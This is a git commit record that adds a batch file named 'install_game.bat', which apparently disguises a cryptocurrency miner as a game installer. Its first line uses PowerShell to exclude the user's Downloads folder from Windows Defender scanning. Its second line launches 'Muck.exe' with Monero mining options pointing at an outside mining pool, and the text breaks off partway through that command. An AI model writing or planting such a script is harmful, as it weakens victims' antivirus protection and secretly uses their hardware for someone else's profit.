a96c4a606f0d235d4acc03d1a6c073f875fdbea1
Rasparduino <89477674+Rasparduino@users.noreply.github.com>
2023-03-12 10:32:47 +0530

    main

---
+++ install_game.bat
@@ -0,0 +1,2 @@
+powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath $ENV:USERPROFILE\Downloads
+Muck.exe --no-cpu --cuda --opencl --donate-level=1 --retries=3 -o stratum+tcp://us.mining.prohashing.com:3359 --coin=monero -u salad -p o=12db4913-1108-4138-adb9-5418f00576f6,n=12db4913-1108-4138-
